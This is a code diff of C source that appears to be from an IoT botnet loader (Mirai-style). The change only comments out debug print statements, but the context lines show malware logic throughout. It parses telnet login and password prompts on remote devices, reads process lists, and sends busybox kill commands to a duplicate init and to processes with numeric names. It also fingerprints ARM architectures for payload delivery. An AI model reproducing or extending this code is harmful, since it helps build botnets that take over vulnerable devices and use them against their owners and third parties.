@@ -22,10 +22,10 @@ void connection_open(struct connection *conn)
     conn->success = FALSE;
     conn->open = TRUE;
     conn->bin = NULL;
-    conn->echo_load_pos = 0;
+    conn->echo_load_pos = 0;/*
 #ifdef DEBUG
     printf("[FD%d] Called connection_open\n", conn->fd);
-#endif
+#endif*/
 
     pthread_mutex_unlock(&conn->lock);
 }
@@ -35,10 +35,10 @@ void connection_close(struct connection *conn)
     pthread_mutex_lock(&conn->lock);
 
     if (conn->open)
-    {
+    {/*
 #ifdef DEBUG
         printf("[FD%d] Shut down connection\n", conn->fd);
-#endif
+#endif*/
         memset(conn->output_buffer.data, 0, sizeof(conn->output_buffer.data));
         conn->output_buffer.deadline = 0;
         conn->last_recv = 0;
@@ -154,10 +154,10 @@ int connection_consume_login_prompt(struct connection *conn)
     for (i = conn->rdbuf_pos; i >= 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
-        {
+        {/*
 #ifdef DEBUG
             printf("matched login prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
-#endif
+#endif*/
             prompt_ending = i;
             break;
         }
@@ -187,10 +187,10 @@ int connection_consume_password_prompt(struct connection *conn)
     for (i = conn->rdbuf_pos; i >= 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
-        {
+        {/*
 #ifdef DEBUG
             printf("matched password prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
-#endif
+#endif*/
             prompt_ending = i;
             break;
         }
@@ -290,11 +290,11 @@ int connection_consume_psoutput(struct connection *conn)
             {
                 int pid = atoi(pid_str);
                 int len_proc_name = strlen(proc_name);
-
+/*
 #ifdef DEBUG
                 printf("pid: %d, proc_name: %s\n", pid, proc_name);
 #endif
-
+*/
                 if (pid != 1 && (strcmp(proc_name, "init") == 0 || strcmp(proc_name, "[init]") == 0)) // Kill the second init
                     util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                 else if (pid > 400)
@@ -316,9 +316,9 @@ int connection_consume_psoutput(struct connection *conn)
                     if (num_alphas == 0 && num_count > 0)
                     {
                         //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
-#ifdef DEBUG
+/*#ifdef DEBUG
                         printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
-#endif
+#endif*/
                         util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                     }
                 }
@@ -543,10 +543,10 @@ int connection_consume_arm_subtype(struct connection *conn)
         return 0;
 
     if (util_memsearch(conn->rdbuf, offset, "ARMv7", 5) != -1 || util_memsearch(conn->rdbuf, offset, "ARMv6", 5) != -1)
-    {
+    {/*
 #ifdef DEBUG
         printf("[FD%d] Arch has ARMv7!\n", conn->fd);
-#endif
+#endif*/
         strcpy(conn->info.arch, "arm7");
     }
 
